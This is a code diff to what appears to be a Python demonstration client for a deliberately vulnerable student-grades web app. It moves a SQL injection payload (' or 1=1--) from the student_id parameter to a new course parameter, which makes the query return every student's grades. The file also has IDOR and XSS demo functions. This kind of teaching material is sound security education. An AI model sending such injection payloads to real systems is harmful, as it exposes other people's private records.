@@ -54,8 +54,9 @@ class Session:
         self.token = data["token"]
         return data["user"]
 
-    def get_grades(self, student_id: str = "") -> list[dict[str, Any]]:
-        query = f"?{urlencode({'student_id': student_id})}" if student_id else ""
+    def get_grades(self, student_id: str = "", course: str = "") -> list[dict[str, Any]]:
+        params = {key: value for key, value in {"student_id": student_id, "course": course}.items() if value}
+        query = f"?{urlencode(params)}" if params else ""
         result = self.request("GET", f"/api/grades{query}")
         return result["data"]["items"]
 
@@ -108,15 +109,15 @@ def demo_idor(base_url: str) -> None:
 def demo_sqli(base_url: str) -> None:
     session = Session(base_url)
     user = session.login("2024001", "123456")
-    payload = "2024001' or 1=1--"
+    payload = "信息安全导论' or 1=1--"
     print(f"已登录学生：{user['name']} ({user['student_id']})")
-    print(f"查询参数 student_id={payload}")
+    print(f"查询参数 course={payload}")
 
-    rows = session.get_grades(payload)
+    rows = session.get_grades(course=payload)
     print_table("SQL 注入形态查询返回结果", rows)
     ids = sorted({str(item.get("student_id", "")) for item in rows})
     print(f"返回 student_id 集合：{', '.join(ids)}")
-    print("演示点：带 SQL 注入形态的参数触发了脆弱查询分支，返回全量成绩。")
+    print("演示点：课程查询参数中的 SQL 注入形态内容触发脆弱分支，返回全量成绩。")
 
 
 def demo_xss(base_url: str) -> None:
